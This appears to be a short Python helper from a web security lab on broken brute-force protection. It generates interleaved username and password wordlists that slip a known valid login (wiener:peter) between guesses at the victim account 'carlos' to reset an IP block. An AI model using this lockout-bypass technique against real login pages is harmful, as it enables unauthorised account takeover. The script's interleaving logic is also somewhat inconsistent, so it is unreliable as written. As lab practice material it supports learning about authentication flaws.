#lab 5 - broken brute force protection IP block 
#Target Goal - Bruteforce the victim's password - carlos
# wiener : peter 
# set resource pool by setting maximum concurrent requests to 1 as there would be no block for each individual one rather than default 10 requests together 
print("########## FOollowing are the usernames ###########")
for i in range(150):
    if i%3:
        print("carlos")
    else:
        print("wiener")
print("########## Bruteforcing the password for carlos ###########")
with open("passwords.txt") as f:
    lines = f.readlines()

i=0
for pwd in lines:
    if i%3:
        print(pwd.strip('\n'))
    else:
        print("peter")
        print(pwd.strip('\n'))
        i+=1
    i=i+1



"""
carlos - 123456 
carlos - password
wiener - peter
carlos - 12345678
carlos - 12345678
wiener - qwerty 
"""
